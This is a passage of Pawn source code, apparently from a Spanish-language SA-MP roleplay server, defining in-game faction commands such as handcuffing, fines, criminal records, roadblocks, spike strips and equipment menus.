		} else Mensaje(playerid, COLOR_GRIS, "Jugado desconectado.");
	} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ascender <PlayerID> <Rango>");
	return 1;
}
	command(equipo, playerid, params[]){
		if(Team_FBI(playerid)){
	    	if(IsPlayerInRangeOfPoint(playerid, 5.0, 222.3244, 186.7450, 1003.0313)){
            	new eq[] = "» Equipo FBI\n» Equipo FBI Misiones\n» Criminalista\n» Encubierto 1\n» Encubierto 2\n» Encubierto 3\n» Chaleco + Salud\n» Ropa Normal";
            	ShowPlayerDialog(playerid, EQUIPO_FBI, DIALOG_STYLE_LIST, ">> Equipo FBI <<", eq, "Equipar", "Cancelar");
			}
		}
		else if(Team_SAMUR(playerid)){
			if(IsPlayerInRangeOfPoint(playerid, 5.0, -2652.1270, 504.4646, 48.0835)){
			    new eq[] = "» Traje Doctor\n» Traje Médico Blanco\n» Traje Médico Azul\n» Traje Médico Verde\n» Traje de Bombero\n» Traje Doctora\n» Indumentario Normal";
			    ShowPlayerDialog(playerid, DIALOGO_EQUIPO_LSPD4, DIALOG_STYLE_LIST, ">> Equipo SAMUR <<", eq, "Equipar", "Cancelar");
			}
		}
        else if(Team_Mecanicos(playerid)){
			if(IsPlayerInRangeOfPoint(playerid, 5.0, 2132.3005, -2280.6406, 14.7769))
			{   new mec[] = "» Ayudante\n» Mecanico\n» Ingeniero\n» Director\n» Ropa Normal";
			    ShowPlayerDialog(playerid, EQUIPO_MECANICO, DIALOG_STYLE_LIST, ">> Equipo Mecánico <<", mec, "Equipar", "Cancelar");
   			}
		}
		else if(Gobierno(playerid)){
		    if(IsPlayerInRangeOfPoint(playerid, 5.0, 366.6122, 158.6483, 1008.3828)){
		        new gob[] = "» Equipo Guardaespaldas\n» Ropa Normal";
		        ShowPlayerDialog(playerid, EQUIPO_GOBIERNO, DIALOG_STYLE_LIST, ">> Equipo Gobierno <<", gob, "Equipar", "Cancelar");
      		}
		} 
	    return 1;
	}
	command(moneda, playerid, params[])
	{
	    new coin = random(2)+1, string[90], coinname[10];
	    if(coin == 1) 	coinname = "cara";
	    else 			coinname = "cruz";
	    format(string, sizeof(string), "*** %s lanza una moneda al aire y cae %s.", PlayerName(playerid), coinname);
	    ProxDetector(10.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	    return 1;
	}
	command(ant, playerid, params[])
    {
        if(IsACop(playerid) || Team_FBI(playerid)){
        if(!booleano[OnDuty]{playerid})return  Mensaje(playerid, COLOR_GRIS, "No estas OnDuty.");
        if(!sscanf(params, "us[64]", params[0], params[1]))
	        {
	            if(IsPlayerConnected(params[0]))
	            {
	                if(StringOther(playerid, params[1]) == 1)
	            	{
		                if (IsACop(params[0]))return Mensaje(playerid, COLOR_GRIS2, "No puedes acusar a un policía.");
		                if(strcmp("None", cuenta[params[0]][cAntecedente1], true) == 0 || strcmp("None", cuenta[params[0]][cAntecedente2], true) == 0 || strcmp("None", cuenta[params[0]][cAntecedente3], true) == 0)
		    			{
								if(strcmp("None", cuenta[params[0]][cAntecedente1], true) == 0)  	strmid(cuenta[params[0]][cAntecedente1], params[1], 0, strlen(params[1]), 64);
								else if(strcmp("None", cuenta[params[0]][cAntecedente2], true) == 0) strmid(cuenta[params[0]][cAntecedente2], params[1], 0, strlen(params[1]), 64);
								else if(strcmp("None", cuenta[params[0]][cAntecedente3], true) == 0) strmid(cuenta[params[0]][cAntecedente3], params[1], 0, strlen(params[1]), 64);

								new string[128];
								Mensaje(playerid, COLOR_ROJO, "_________| Antecedentes Policiales |_________");
								Mensaje(params[0], COLOR_ROJO, "_________| Antecedentes Policiales |_________");
				    			format(string, sizeof(string), "- %s", cuenta[params[0]][cAntecedente1]);    	Mensaje(playerid, COLOR_AMARILLO2, string);    Mensaje(params[0], COLOR_AMARILLO2, string);
							    format(string, sizeof(string), "- %s", cuenta[params[0]][cAntecedente2]);    	Mensaje(playerid, COLOR_AMARILLO2, string);    Mensaje(params[0], COLOR_AMARILLO2, string);
							    format(string, sizeof(string), "- %s", cuenta[params[0]][cAntecedente3]);   	Mensaje(playerid, COLOR_AMARILLO2, string);    Mensaje(params[0], COLOR_AMARILLO2, string);
							    Mensaje(playerid, COLOR_ROJO, "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
								Mensaje(params[0], COLOR_ROJO, "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
							    format(string, sizeof(string), "* El oficial %s escribe en el historial de %s", PlayerName(playerid), PlayerName(params[0]));
							    ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
							}
						else Mensaje(playerid, COLOR_GRIS2, "Ha alcanzado el límite de Antecedentes");
					}
					else Mensaje(playerid, COLOR_GRIS2, "* Has utilizado carácteres no permitidos.");
				}
				else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
	        }
	        else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ant <PlayerID> <Antecedente>");
        }
        else Mensaje(playerid, COLOR_GRIS2, "»{FFFFFF} No perteneces a ningún departamento de seguridad.");
        return 1;
    }
	command(expediente, playerid, params[])
	{
	    if(!IsPlayerConnected(playerid))return Mensaje(playerid, COLOR_GRIS2, "Primero conectate!");
        if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /expediente <PlayerID>");
		if(!IsPlayerConnected(params[0]))return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		if(dDistanciaJugador(8.0, playerid, params[0]))
		{
		    new string[64];
			Mensaje(params[0], COLOR_VERDE, "______-= Expediente policial =-_______");
            format(string, sizeof(string), "  Nombre: %s", PlayerName(playerid));
            Mensaje(params[0], COLOR_BLANCO, string);
			Mensaje(params[0], COLOR_AMARILLO3, "  Antecedentes:");
            format(string, sizeof(string), "  - %s", cuenta[playerid][cAntecedente1]);
            Mensaje(params[0], COLOR_BUSCADO, string);
            format(string, sizeof(string), "  - %s", cuenta[playerid][cAntecedente2]);
   			Mensaje(params[0], COLOR_BUSCADO, string);
            format(string, sizeof(string), "  - %s", cuenta[playerid][cAntecedente3]);
            Mensaje(params[0], COLOR_BUSCADO, string);
            Mensaje(params[0], COLOR_VERDE, "_______________________________________");
            format(string, sizeof(string), "* %s le muestra a %s su expediente.", PlayerName(playerid), params[0]);
            ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		}
		else Mensaje(playerid, COLOR_GRIS2, "Jugador está lejos de ti.");
		return 1;
	}
	
command(nokear, playerid, params[]){
	new player, rands = random(2)+1, string[128];
	if(sscanf(params, "u", player))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /nokear <ID>");
	if(booleano[AdminDuty]{player})return Mensaje(playerid, COLOR_ROJO, "Administrador en Servicio.");
	if(cuenta[playerid][cNivel] < 2)return Mensaje(playerid, COLOR_GRIS2, "Usted debe ser mayor al nivel 2.");
	if(KnockedDown[playerid] == 0 || IsPlayerInAnyVehicle(playerid) || IsPlayerInAnyVehicle(player)){
		if(dDistanciaJugador(3.0, playerid, player)){
			format(string, sizeof(string), "* %s agarra una piedra.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			ApplyAnimation(playerid, "FIGHT_D", "FightD_3", 4.0, 0, 1, 1, 0, 0);
			KnockedDown[playerid] = 100;
			if(rands == 1){
				ApplyAnimation(player, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
				SetTimerEx("ClearKnock", 60000, false, "i", player, playerid);
				KnockedDown[player] = 1;
				format(string, sizeof(string), "* %s intenta noquear a %s con la piedra y lo consige.", PlayerName(playerid), PlayerName(player));
				ProxDetector(3.0, playerid, string, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2);
				format(string, sizeof(string), "* %s queda inconsciente.", PlayerName(player));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}else{
				format(string, sizeof(string), "* %s intenta noquear a %s con la piedra y le da muy suave.", PlayerName(playerid), PlayerName(player));
				ProxDetector(3.0, playerid, string, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4);
			}
		}else return Mensaje(playerid, COLOR_GRIS2, "El jugador está muy lejos de usted.");
	}else return Mensaje(playerid, COLOR_GRIS2, "Usted no puede utilizar este comando ahora.");
	return 1;
}
 //----------------Pinchos-------------------------------------------//
command(pstrips, playerid, params[])
	{
	    if(!IsACop(playerid))return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No perteneces a ningún departamento policial.");
	    if(!booleano[OnDuty]{playerid})return  Mensaje(playerid, COLOR_GRIS, "No estas OnDuty.");
	    new Float:plocx, Float:plocy, Float:plocz, Float:ploca;
        GetPlayerPos(playerid, plocx, plocy, plocz);
        GetPlayerFacingAngle(playerid, ploca);
        CreateStrip(plocx, plocy, plocz, ploca);
		{
		GameTextForPlayer(playerid, "~r~Banda de clavos ~w~puesto!", 3000, 1);
  			}
	    return 1;
	}
	command(qstrips, playerid, params[])
	{
	    if(!IsACop(playerid))return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
     	if(!booleano[OnDuty]{playerid})return  Mensaje(playerid, COLOR_GRIS, "No estas OnDuty.");
        DeleteClosestStrip(playerid);
        GameTextForPlayer(playerid, "~r~Banda de clavos ~w~eliminada!", 3000, 1);
	    return 1;
	}
	command(astrips, playerid, params[])
	{
	    if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	    if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        DeleteAllStrip();
        GameTextForPlayer(playerid, "~r~Banda de clavos ~w~eliminadas!", 3000, 1);
	    return 1;
	}
    command(retener, playerid, params[])
	{
        if(!IsACop(playerid))return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No perteneces a ningún cuerpo de seguridad.");
		if(!sscanf(params, "u", params[0])){
            if (dDistanciaJugador(8.0, playerid, params[0])){
                if(params[0] == INVALID_PLAYER_ID)return Mensaje(playerid, COLOR_GRIS2, "ID invalida.");
		        new string[64];
			    TogglePlayerControllable(params[0], 0);
			    Freezed[params[0]] = 1;
			    format(string, sizeof(string), "", PlayerName(playerid), PlayerName(params[0]));
		        Mensaje(params[0], COLOR_ROJO, string);
			    return AdminMensaje(string);
             } else Mensaje(playerid, COLOR_GRIS, "El jugador está muy lejos.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /retener <PlayerID>");
        return 1;
    }
command(esposar, playerid, params[]){
	new player, string[128];
	if(IsACop(playerid) || Team_FBI(playerid)){
		if(!sscanf(params, "u", player)){
			if(player == playerid)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF}No puedes esposarte a ti mismo.");
            if(dDistanciaJugador(8.0, playerid, player)){
				if(!booleano[PlayerCuffed]{player}){
					format(string, sizeof(string), "* Oficial %s esposa al sospechoso %s", PlayerName(playerid), PlayerName(player));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					GameTextForPlayer(player, "~r~ESPOSADO", 2500, 3);
					booleano[PlayerCuffed]{player} = true;
                    SetPlayerSpecialAction(player, 24);
				}else{
				    format(string, sizeof(string), "* Oficial %s desesposa a %s", PlayerName(playerid), PlayerName(player));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					GameTextForPlayer(player, "~g~LIBRE", 2500, 3);
					booleano[PlayerCuffed]{player} = false;
					SetPlayerSpecialAction(player, SPECIAL_ACTION_NONE);
				}
			}else return Mensaje(playerid, COLOR_GRIS, "El jugador está muy lejos.");
        }else return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /esposar <PlayerID>");
	}else return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No perteneces a ningún departamento de seguridad.");
	return 1;
}
COMMAND:sospechosos(playerid, params[])
{
 	if(Team_LSPD(playerid) || Team_FBI(playerid))
	{
		if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_ROJO, "No estas en servicio.");
		new encontro, string[126];
		
		Mensaje(playerid, COLOR_VERDE, "Sospechosos más buscados");
		for(new i=0, t=GetMaxPlayers(); i<t; i++)
		{
			if(!cuenta[i][cBusqueda])continue;
			format(string, sizeof(string), "{ffffff}Nombre: {ff0000}%s {ffffff}Nivel de Busqueda: {FF7F00}%d", PlayerName(i), cuenta[i][cBusqueda]);
			Mensaje(playerid, COLOR_BUSCADO, string);
			encontro++;
		}
		if(!encontro) Mensaje(playerid, COLOR_BUSCADO, "Sospechosos no encontrados.");
	}else return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No perteneces a ningún departamento de seguridad.");
	return 1;
}
COMMAND:su(playerid, params[])
{
	if(Team_LSPD(playerid) || Team_FBI(playerid))
	{
		if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No estas OnDuty.");
		new usuario, crimen[64];
		if(sscanf(params, "us[64]", usuario, crimen))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /su [Usuario] [Crimen]");
		
		if(!IsPlayerConnected(usuario))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");
		if(Team_LSPD(usuario) || Team_FBI(usuario))return Mensaje(playerid, COLOR_GRIS2, "Este jugador pertenece a la justicia.");
		
		cuenta[usuario][cBusqueda]++;
		
		SendRadioMessage(1, TEAM_RADIO_COLOR, "** Central: se ha encontrado un nuevo sospechoso, para más información miren sus ordenadores.");
		SendRadioMessage(9, TEAM_RADIO_COLOR, "** Central: se ha encontrado un nuevo sospechoso, para más información miren sus ordenadores.");
		
		new string[64];
		ClearChatbox(playerid, 21);
		format(string, sizeof(string), "** Acusaste a %s de %s", PlayerName(usuario), crimen);
		Mensaje(playerid, COLOR_BUSCADO, string);
		format(string, sizeof(string), "Nivel de búsqueda: %d", cuenta[usuario][cBusqueda]);
		Mensaje(playerid, COLOR_BUSCADO, string);
		
	}else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No perteneces a ningún cuerpo de seguridad.");
	return 1;
}
COMMAND:limpiar(playerid, params[])
{
	if(Team_LSPD(playerid) || Team_FBI(playerid))
	{
		if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS, "No estas OnDuty.");
		new usuario, item, string[126];
		if(sscanf(params, "ud", usuario, item))
		{
			Mensaje(playerid, COLOR_GRIS2, "Utiliza: /limpiar [Usuario] [Item]");
			Mensaje(playerid, COLOR_GRIS2, "Item: 0-todo 1-Antecedente 2-Antecedente 3-Antecedente 4-Nivel de busqueda");
			return 1;
		}
		
		switch(item)
		{
			case 1:
			{
				format(cuenta[usuario][cAntecedente1], 64, "Sin Antecedente");
				format(string, sizeof(string), "%s limpió el antecedente 1º de %s", PlayerName(playerid), PlayerName(usuario));
				Mensaje(playerid, COLOR_VERDE, string);
				Mensaje(usuario, COLOR_VERDE, string);
			}
			case 2:
			{
				format(cuenta[usuario][cAntecedente2], 64, "Sin Antecedente");
				format(string, sizeof(string), "%s limpió el antecedente 2º de %s", PlayerName(playerid), PlayerName(usuario));
				Mensaje(playerid, COLOR_VERDE, string);
				Mensaje(usuario, COLOR_VERDE, string);
			}
			case 3:
			{
				format(cuenta[usuario][cAntecedente3], 64, "Sin Antecedente");
				format(string, sizeof(string), "%s limpió el antecedente 3º de %s", PlayerName(playerid), PlayerName(usuario));
				Mensaje(playerid, COLOR_VERDE, string);
				Mensaje(usuario, COLOR_VERDE, string);
			}
			case 4:
			{
				cuenta[usuario][cBusqueda] = 0; 
				format(string, sizeof(string), "%s canceló el nivel de búsqueda de %s", PlayerName(playerid), PlayerName(usuario));
				Mensaje(playerid, COLOR_VERDE, string);
				Mensaje(usuario, COLOR_VERDE, string);
			}
			default:
			{
				format(cuenta[usuario][cAntecedente1], 64, "Sin Antecedente");
				format(cuenta[usuario][cAntecedente2], 64, "Sin Antecedente");
				format(cuenta[usuario][cAntecedente3], 64, "Sin Antecedente");
				cuenta[usuario][cBusqueda] = 0; 
				format(string, sizeof(string), "%s limpió los antecedentes y la búsqueda de %s", PlayerName(playerid), PlayerName(usuario));
				Mensaje(playerid, COLOR_VERDE, string);
				Mensaje(usuario, COLOR_VERDE, string);
			}
		}
	}else Mensaje(playerid, COLOR_GRIS2, "No eres policía.");
	return 1;
}

COMMAND:bk(playerid, params[])
{
	if(booleano[jObjetivo]{playerid})return Mensaje(playerid, COLOR_GRIS2, "Ya tienes un pedido de ayuda.");
	new string[128];
	
	if(Team_LSPD(playerid))
	{
		format(string, sizeof(string), "* A todas las unidades, %s necesita ayuda (Información marcada).", PlayerName(playerid));
		SendRadioMessage(1, TEAM_RADIO_COLOR, string);
		for(new i=0, t=GetMaxPlayers(); i < t; i++)
		{
			if(!IsPlayerConnected(i)) continue;
			if(Team_LSPD(i))
			{
				if(booleano[OnDuty]{i})
				{
					booleano[jObjetivo]{playerid} = true;
					Mensaje(playerid, COLOR_VERDE, "Usted acaba de ordenar refuerzos.");
					return 1;
				}
			}
		}
	}
	else if(Team_FBI(playerid))
	{
		format(string, sizeof(string), "* A todas las unidades, %s necesita ayuda (Información marcada).", PlayerName(playerid));
		SendRadioMessage(9, TEAM_RADIO_COLOR, string);
		for(new i=0, t=GetMaxPlayers(); i < t; i++)
		{
			if(!IsPlayerConnected(i)) continue;
			if(Team_FBI(i))
			{
				if(booleano[OnDuty]{i})
				{
					booleano[jObjetivo]{playerid} = true;
				}
			}
		}
	} else Mensaje(playerid, COLOR_BLANCO, "No autorizado!");
	SetTimerEx("BackupClear", 180000, false, "ii", playerid, 1);
	return 1;
}
COMMAND:bkc(playerid, params[])
{
	if(IsACop(playerid))
	{
		BackupClear(playerid, 0);
	}
	else
	{
		Mensaje(playerid, COLOR_BLANCO, "No autorizado!");
	}
	return 1;
}

command(ta, playerid, params[]){
	new string[128];
	if(IsACop(playerid) || Team_FBI(playerid)){
		if(!booleano[Tazer]{playerid}){
			format(string, sizeof(string), "* %s carga su tazer", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			SetPlayerAttachedObject(playerid, 0, 18642, 6, 0.070212, 0.017647, 0.065603, 0.000000, 185.632217, 264.085418, 1.000000, 1.000000, 1.000000 );
			Att_Obj_Slot_0[playerid] = "Tazer";
			booleano[Tazer]{playerid} = true;
		}else{
			format(string, sizeof(string), "* %s guarda su tazer", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			booleano[Tazer]{playerid} = false;
			RemoveHand(playerid);
		}
	}else return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No perteneces a ningún departamento de seguridad.");
	return 1;
}
 
command(bar, playerid, params[]){
	if(IsACop(playerid) || Team_FBI(playerid)){
		if(!booleano[OnDuty]{playerid})return  Mensaje(playerid, COLOR_GRIS, "No estas OnDuty.");
		if(!sscanf(params, "i", params[0])){
            new Float:plocx, Float:plocy, Float:plocz, Float:ploca;
        	GetPlayerPos(playerid, plocx, plocy, plocz);
	        GetPlayerFacingAngle(playerid, ploca);
	        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            switch(params[0]){
                case 1: CreateRoadblock(1459, plocx, plocy, plocz, ploca);
                case 2: CreateRoadblock(978, plocx, plocy, plocz+0.6, ploca);
                case 3: CreateRoadblock(981, plocx, plocy, plocz+0.9, ploca+180);
                case 4: CreateRoadblock(1238, plocx, plocy, plocz+0.2, ploca);
                case 5: CreateRoadblock(1425, plocx, plocy, plocz+0.3, ploca);
                case 6: CreateRoadblock(3265, plocx, plocy, plocz-0.5, ploca);
                case 7: CreateRoadblock(3091, plocx, plocy, plocz+0.5, ploca+180);
                default: Mensaje(playerid, COLOR_GRIS2, "Utiliza: (/bar)rera <ID:1-7>");
            }
			GameTextForPlayer(playerid, "~r~barrera ~w~puesta!", 3000, 1);
		}else{
			Mensaje(playerid, COLOR_GRIS2, "Utiliza: (/bar)rera <ID>");
			Mensaje(playerid, COLOR_GRIS2, "IDs: 1. Pequeña | 2. Mediana | 3. Grande");
			Mensaje(playerid, COLOR_GRIS2, "IDs: 4. Cono | 5. Desvío | 6. Prohibido | 7.Cierre");
			Mensaje(playerid, COLOR_GRIS2, "Utiliza: /qb para quitar la barrera más cercana");
		}
	}else return Mensaje(playerid, COLOR_GRIS2, "No eres policía.");
	return 1;
}

	command(qb, playerid, params[])
    {
        if(IsACop(playerid) || cuenta[playerid][cAdministrador] > 3)
     	{
        	DeleteClosestRoadblock(playerid);
	        GameTextForPlayer(playerid, "~r~barrera ~w~eliminada!", 3000, 1);
		}
        return 1;
    }
    command(qbs, playerid, params[])
	{
	    if(IsACop(playerid) || cuenta[playerid][cAdministrador] >= 3)
     	{
			if(cuenta[playerid][cRango] >= 6 || cuenta[playerid][cAdministrador] >= 3)
			{
        		DeleteAllbarreras(playerid);
	        	return GameTextForPlayer(playerid, "~w~barreras ~r~eliminadas", 3000, 1);
			}
		}
	    return 1;
	}
    command(multar, playerid, params[])
    {
        if(!Team_LSPD(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres policia!");
        if(!booleano[OnDuty]{playerid})return  Mensaje(playerid, COLOR_GRIS, "No estas OnDuty.");
        if(!sscanf(params, "uis[64]", params[0], params[1], params[2]))
        {
            if(params[1] < 0 || params[1] > 6000)return Mensaje(playerid, COLOR_GRIS, "El máximo de multa son 6000$");
            if(IsPlayerConnected(params[0]))
			{
			    if(booleano[Facturing]{playerid})return Mensaje(playerid, COLOR_GRIS2, "Este jugador ya tiene una petición pendiente");
			    if(!dDistanciaJugador(8.0, playerid, params[0]))return Mensaje(playerid, COLOR_GRIS2, "Muy lejos de el jugador.");
			    new string[128];
			    if(obtenerDinero(params[0]) < params[1])
				{
    				format(string, sizeof(string), "* El infractor no tiene %d$ para pagar la multa.", params[1]);
					return Mensaje(playerid, COLOR_GRIS2, string);
				}
				else
				{
				    ClearChatbox(playerid, 10);
				    Mensaje(params[0], -1, "  {1A5FFF}Estado de San Andreas");
				    format(string, sizeof(string), "  {89CBC1}Demandante: {FFFFFF}%s", PlayerName(playerid));
					Mensaje(params[0], -1, string);
					format(string, sizeof(string), "  {89CBC1}Infracción: {FFFFFF}%s", params[2]);
					Mensaje(params[0], -1, string);
					format(string, sizeof(string), "  {FF1700}Multa: {FFFFFF}%d$", params[1]);
					Mensaje(params[0], -1, string);
					Mensaje(playerid, COLOR_BLANCO, "* Espere la respuesta del sujeto");
					Mensaje(params[0], COLOR_BLANCO, "Lo han multado. Utilice [/aceptar multa ó /cancelar multa] para pagar la multa.");
					TicketOffer[params[0]] = playerid;
					TicketMoney[params[0]] = params[1];
					booleano[Facturing]{params[0]} = true;
				}
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /multar <ID> <precio> <razón>");
        return 1;
    }
    command(m, playerid, params[])
    {
		if(estaSilenciado(playerid))return 1;
        if(sscanf(params, "s[128]", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /m <texto>");
        if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
		if(Team_SAMUR(playerid) || IsACop(playerid))
        {
			new string[128];
			format(string, sizeof(string), "(Megáfono) %s: %s", PlayerName(playerid), params[0]);
			ProxDetector(60.0, playerid, string, COLOR_MEGAFONO, COLOR_MEGAFONO, COLOR_MEGAFONO, COLOR_MEGAFONO, COLOR_MEGAFONO);
        } else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        return 1;
    }
    command(aceptar, playerid, params[])
	{
        if(!sscanf(params, "s[64]", params[0]))
        {
            new string[128];
            if(strcmp(params[0], "telefono", true) == 0)
            {
                if(NumBuy[playerid] == 0)return Mensaje(playerid, COLOR_GRIS2, "Nadie te ha ofrecido un número!");
                if(NumPrice[playerid] > obtenerDinero(playerid))return Mensaje(playerid, COLOR_GRIS2, "No tienes suficiente dinero!");
                format(string, sizeof(string), "* %s compra un número de teléfono", PlayerName(playerid));
                ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                cuenta[playerid][cTelefono] = NumBuy[playerid];
                ganaDinero(NumSeller[playerid], NumPrice[playerid]);
                pierdeDinero(playerid, NumPrice[playerid]);
                NumBuy[playerid] = 0;
                NumPrice[playerid] = 0;
                NumSeller[playerid] = 0;
                booleano[Facturing]{playerid} = false;
            }
			else if(strcmp(params[0], "multa", true) == 0)
			{
			    if(TicketOffer[playerid] == 999)return Mensaje(playerid, COLOR_GRIS2, "Nadie te multado!");
			    format(string, sizeof(string), "* %s paga una multa.", PlayerName(playerid));
   				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
   				format(string, sizeof(string), " {FFC990}%s {FFFFFF}pagó una multa de {3E9EEA}%d$.", PlayerName(playerid), TicketMoney[playerid]);
				MensajeAmbos(playerid, TicketOffer[playerid], -1, string);
   				pierdeDinero(playerid, TicketMoney[playerid]);
   				ganaDinero(TicketOffer[playerid], TicketMoney[playerid]);
   				TicketOffer[playerid] = 999;
				TicketMoney[playerid] = 0;
				booleano[Facturing]{playerid} = false;
			}
			else if(strcmp(params[0], "saludo", true) == 0)
			{
			    if(Saludo_ID[playerid] == 999)return Mensaje(playerid, COLOR_GRIS2, "Nadie te ha ofrecido un saludo!");
				format(string, sizeof string, "* %s acepta el saludo de %s.", PlayerName(playerid), PlayerName(Saludo_ID[playerid]));
			    ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			    ApplyAnimation(playerid, "GANGS", "hndshkfa_swt", 4.1, 0, 0, 0, 0, 0);
			    ApplyAnimation(Saludo_ID[playerid], "GANGS", "hndshkfa_swt", 4.1, 0, 0, 0, 0, 0);
			    Saludo_ID[playerid] = 999;
			}
			else if(strcmp(params[0], "proteccion", true) == 0)
			{
 			if(Guardes_Oferta[playerid] < 998)
 			{
 			if(obtenerDinero(playerid) > Guardes_Precio[playerid])
				{
				format(string, sizeof(string), "* Has aceptado la protección del guardespaldas %s por $%d.", PlayerName(Guardes_Oferta[playerid]), Guardes_Precio[playerid]);
				Mensaje(playerid, COLOR_BLANCO, string);
				format(string, sizeof(string), "* %s Ha aceptado tu protección por $%d, se han añadido a su payday.", PlayerName(playerid), Guardes_Precio[playerid]);
				Mensaje(Guardes_Oferta[playerid], COLOR_BLANCO, string);
    			MoneyGiveToPlayer(Guardes_Oferta[playerid], Guardes_Precio[playerid]);
    			pierdeDinero(playerid, -Guardes_Precio[playerid]);
				Guardes_Oferta[playerid] = 999;
				Guardes_Precio[playerid] = 0;
				format(string, sizeof(string), "* %s acepta el contrato del guardespaldas", PlayerName(playerid), PlayerName(Guardes_Oferta[playerid]));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
  				return 1;
  					}
					else
					{
						Reparar_Oferta[playerid] = 999;
						Reparar_Precio[playerid] = 0;
						format(string, sizeof(string), "* %s Ha rechazado tu protección porque no posee el dinero.", PlayerName(playerid));
						Mensaje(Guardes_Oferta[playerid], COLOR_BLANCO, string);
						Mensaje(playerid, COLOR_GRIS, "No tienes el dinero para pagar la protección.");
						return 1;
						}
					} else Mensaje(playerid, COLOR_GRIS, "Nadie te ha ofrecido protección!.");
			}
		}
        else
        {
            Mensaje(playerid, COLOR_GRIS2, "Utiliza: /aceptar <item>");
            Mensaje(playerid, COLOR_GRIS2, "Items: telefono, multa, saludo");
        }
        return 1;
    }
    command(cancelar, playerid, params[])
    {
        if(!sscanf(params, "s[64]", params[0]))
        {
            new string[128];
            if(strcmp(params[0], "telefono", true) == 0)
            {
			    if(NumBuy[playerid] == 0)return Mensaje(playerid, COLOR_GRIS2, "Nadie te ha ofrecido un número!");
                format(string, sizeof(string), "* %s cancela la compra del número de teléfono", PlayerName(playerid));
                ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                NumBuy[playerid] = 0;
                NumPrice[playerid] = 0;
                NumSeller[playerid] = 0;
                booleano[Facturing]{playerid} = false;
			}
		    else if(strcmp(params[0], "multa", true) == 0)
		    {
			    if(TicketOffer[playerid] == 999)return Mensaje(playerid, COLOR_GRIS2, "Nadie te multado!");
                format(string, sizeof(string), "* %s se niega a pagar una multa.", PlayerName(playerid));
                ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
                format(string, sizeof(string), "* {FFC990}%s {FFFFFF}canceló el pago de una multa de {3E9EEA}%d$.", PlayerName(playerid), TicketMoney[playerid]);
                Mensaje(playerid, -1, string);
